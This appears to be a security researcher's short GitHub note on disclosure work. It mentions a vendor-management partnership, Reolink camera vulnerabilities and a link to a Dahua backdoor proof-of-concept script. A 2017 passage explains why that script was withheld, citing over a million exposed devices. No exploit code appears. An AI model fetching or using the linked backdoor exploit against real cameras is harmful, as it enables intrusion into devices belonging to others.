Greetings, long time and no publish ...

I am still around and doing my research, but the news is that I also try to work with VDOO (https://www.vdoo.com/) for vendor management, and this has unfortunately delayed my Full Disclosure process somewhat ...

Anyway, several interesting researches coming up as Full Disclosure here on my GitHub.

With the collaboration with VDOO I can work with that I like to do, and not waste time with the vendors who do (not want | don't understand | want to ignore | want to delay | whatever).

The latest are some Reolink (https://reolink.com/) stuff, which you will find here: https://www.vdoo.com/blog/working-with-the-community-%E2%80%93-significant-vulnerabilities-in-reolink-cameras/.

Public rerelease of Dahua Backdoor PoC
https://github.com/mcw0/PoC/blob/master/dahua-backdoor-PoC.py

2017-03-20

With my newfound knowledge of vulnerable devices out there with an unbelievable number of more than 1 million Dahua / OEM units, where knowledge comes from a report made by NSFOCUS and my own research on shodan.io.

With this knowledge, I will not release the Python PoC to the public as before said of April 5, as it is not necessary when the PoC has already been verified by IPVM and other independent security researchers.

However, I'm open to share the PoC with serious security researchers if so desired, please e-mail me off list and be clear about who you are so I do not take you for a beggar, which I ignore.
